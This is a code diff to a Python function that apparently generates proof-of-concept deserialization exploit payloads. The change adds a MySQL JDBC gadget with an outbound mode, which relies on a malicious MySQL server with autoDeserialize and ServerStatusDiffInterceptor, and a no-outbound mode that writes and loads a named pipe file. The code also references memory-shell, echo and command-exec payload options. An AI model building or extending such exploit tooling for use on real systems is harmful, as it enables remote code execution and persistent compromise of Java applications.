@@ -386,6 +386,8 @@ def generate_poc_1280(
         user=opts.user,
         socket_factory_arg=socket_arg,
         classpath=classpath,
+        outbound=opts.outbound,
+        named_pipe_path=opts.named_pipe_path,
     )
     if opts.wrap_currency:
         steps_raw = [
@@ -400,7 +402,17 @@ def generate_poc_1280(
     notes.extend(extra_notes)
     if entry.steps > 1:
         notes.append(f"本 gadget 共 {len(steps)} 步，请按 steps 顺序发送。")
-    if not echo_on and not memshell_on and not exec_on:
+    if entry.id == "mysql_jdbc":
+        if opts.outbound:
+            notes.append(
+                "出网：需恶意 MySQL（autoDeserialize + ServerStatusDiffInterceptor）。"
+            )
+        else:
+            notes.append(
+                f"不出网：先写 Pipe 文件再加载；namedPipePath="
+                f"{opts.named_pipe_path or '/tmp/mysql.pcap'}"
+            )
+    elif not echo_on and not memshell_on and not exec_on:
         notes.append(f"写文件证明：{entry.marker_file} ← {entry.marker_content!r}")
     if opts.wrap_currency:
         notes.append(
